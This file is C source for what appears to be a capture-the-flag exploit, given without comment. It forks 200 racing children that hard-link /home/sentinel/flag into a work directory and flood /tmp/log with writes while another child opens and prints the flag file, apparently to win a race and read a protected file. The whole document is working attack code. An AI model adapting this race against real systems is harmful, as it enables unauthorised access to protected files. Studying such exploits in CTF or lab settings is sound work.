#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<string.h>
#include<sys/syscall.h>
#include<linux/openat2.h>
#include<sys/mman.h>
#include<wait.h>

#define SEC 1
#define NANOSEC 995000000

char *lock;
char *GLOBBUF;

void printError(char *msg){
  puts(msg);
  exit(0);
}

void childToLoadFlag(){
  struct open_how *openHow = malloc(0x18);
  openHow->flags = O_RDONLY;
  lock[1] = 1;
  while(lock[0]==0);
  sleep(2);
  int fd = syscall(__NR_openat2,AT_FDCWD,"flag",openHow,0x18);
  char buf[0x100];
  memset(buf,0,0x100);
  write(1,buf,read(fd,buf,0x100));
  write(1,"\n",1);
  syscall(__NR_exit,0);
}

void childToHaltWrite(int fd){
  while(lock[0]==0);
  write(fd,GLOBBUF,0x1000000);
  syscall(__NR_exit,0);
}

void childToCopyUp(){
  struct timespec T = {.tv_sec=SEC,.tv_nsec=NANOSEC};
  while(lock[0]==0);
  syscall(__NR_nanosleep,&T,NULL);
  syscall(__NR_link,"/home/sentinel/flag","/home/sentinel/work/F");
  syscall(__NR_exit,0);
}

int main(){
  int fd = open("/tmp/log",O_CREAT|O_RDWR|O_APPEND,S_IRUSR|S_IWUSR);
  GLOBBUF = mmap(0,0x1000000,7,MAP_SHARED|MAP_ANONYMOUS,-1,0);
  int CHILDCNT = 200;
  printf("racer cnt %d\n",CHILDCNT);
  pid_t *child = calloc(sizeof(pid_t)*(CHILDCNT+1),1);
  lock = mmap(0,0x1000,7,MAP_SHARED|MAP_ANONYMOUS,-1,0);
  if(lock==(void*)-1) printError("mmap Failed");
  child[0] = fork();
  if(child[0]==-1) printError("forkFailed");
  if(child[0]==0) childToLoadFlag();
  for(int i=1;i<=CHILDCNT;i++){
    child[i] = fork();
    if(child[i]==-1){
      for(int j=0;j<i;j++) kill(child[j],9);
      printError("forkFailed");
    }
    if(child[i]==0){
      if(i<CHILDCNT/2)
        childToCopyUp();
      else
        childToHaltWrite(fd);
    }
  }
  while(lock[1]==0);
  lock[0] = 1;
  waitpid(child[0],NULL,0);
  write(1,"all done\n",9);
  return 0;
}
